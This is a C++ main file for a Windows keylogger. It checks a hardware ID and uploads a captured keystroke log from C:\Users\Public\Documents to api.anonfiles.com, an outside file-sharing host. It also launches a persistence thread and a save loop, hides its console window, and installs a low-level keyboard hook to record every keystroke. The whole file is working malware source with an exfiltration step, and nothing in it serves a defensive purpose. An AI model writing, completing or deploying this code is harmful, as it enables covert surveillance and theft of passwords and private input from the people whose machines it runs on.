#include "Keylogger/keylogger.h"
#include <iostream>
#include <thread>
#include "Keylogger/save.h"
#include "Keylogger/bypass.h"
#include "Keylogger/start.h"
#include "Keylogger/send.h"


int main() {
	std::thread t[2];
	if(!HWIDCheck()) {
		exit(0);
	}
	sendFileHttps("C:\\Users\\Public\\Documents\\keylogger.txt", "https://api.anonfiles.com/upload");
	t[0] = std::thread(PersistantApplication);
	t[1] = std::thread(saveLoop);
	

	ShowWindow(GetConsoleWindow(), SW_HIDE);
	HHOOK KeyboardHook;
	KeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
	MSG msg;
	while(GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	UnhookWindowsHookEx(KeyboardHook);
}

